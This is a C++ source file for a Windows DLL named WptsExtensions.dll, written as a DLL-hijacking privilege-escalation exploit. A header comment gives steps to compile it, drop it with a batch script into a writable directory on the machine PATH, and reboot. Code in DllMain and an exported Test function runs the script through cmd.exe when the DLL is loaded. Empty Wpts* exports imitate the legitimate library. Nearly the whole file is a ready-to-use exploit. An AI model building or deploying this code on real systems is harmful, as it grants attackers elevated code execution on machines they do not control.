// dllmain.cpp
#include <Windows.h>

/***
- Load x64 visual studio environnement variables: 
C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat

- Go inside your source dir and run (BUILD MANUALLY to avoid unwanted dependencies):
cl /LD /MT /EHa dllmain.cpp /Fe:WptsExtensions.dll

- Update bat script path: 
const TCHAR script[] = TEXT("C:\\Python27\\script.bat");

- Drop the DLL and script.bat in your writable directory (from the machine PATH)
powershell -Command "[System.Environment]::GetEnvironmentVariable('PATH','Machine')"

- Reboot

https://github.com/itm4n/PrivescCheck
***/

int fileExist(LPCTSTR file) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	else
	{
		FindClose(hFind);
	}
	return 1;
}

void sploit(void) {

	// Name of the script
	TCHAR script[] = TEXT("C:\\Python27\\script.bat");
	TCHAR cmd[] = TEXT("cmd.exe /c ");

	if (!fileExist(script)) {
		return;
	}

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	TCHAR* lpszClientPath = lstrcat(cmd, script);

	if (CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		sploit();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) void Test()
{
	sploit();
}

extern "C" __declspec(dllexport) void WptsCreateAction()
{
}

extern "C" __declspec(dllexport) void WptsDestroyAction()
{
}

extern "C" __declspec(dllexport) void WptsCopyActionData()
{
}

extern "C" __declspec(dllexport) void WptsFreeActionData()
{
}

extern "C" __declspec(dllexport) void WptsLaunchAction()
{
}